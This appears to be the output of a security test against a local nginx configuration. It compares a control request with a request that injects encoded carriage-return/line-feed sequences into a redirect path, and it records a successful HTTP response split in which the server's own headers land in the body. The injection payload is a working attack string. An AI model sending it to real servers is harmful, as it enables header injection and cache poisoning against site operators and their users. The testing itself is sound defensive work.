target port 19001 cfg ./nginx.conf, injected directory tail '\r\n\r\nHTTP'
one request: GET /sub%0D%0A%0D%0AHTTP

control - plain document, head must be complete, no stranded fields
  GET /
    status line : HTTP/1.1 200 OK
    head as a client parses it:
      | HTTP/1.1 200 OK
      | ETag: "1794816049-47"
      | Content-Type: text/html
      | Content-Length: 47
      | Connection: keep-alive
    body         : b'<!DOCTYPE html><html><body>hello</body></html>\n'
    header fields stranded in body: []

sink under test
  GET /sub%0D%0A%0D%0AHTTP
    status line : HTTP/1.1 301 Moved Permanently
    head as a client parses it:
      | HTTP/1.1 301 Moved Permanently
      | Location: /sub
    body         : b'HTTP/\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n'
    header fields stranded in body: ['Content-Length: 0', 'Connection: keep-alive']

verdict: SPLIT - the head is torn and the server's own header fields are now body bytes
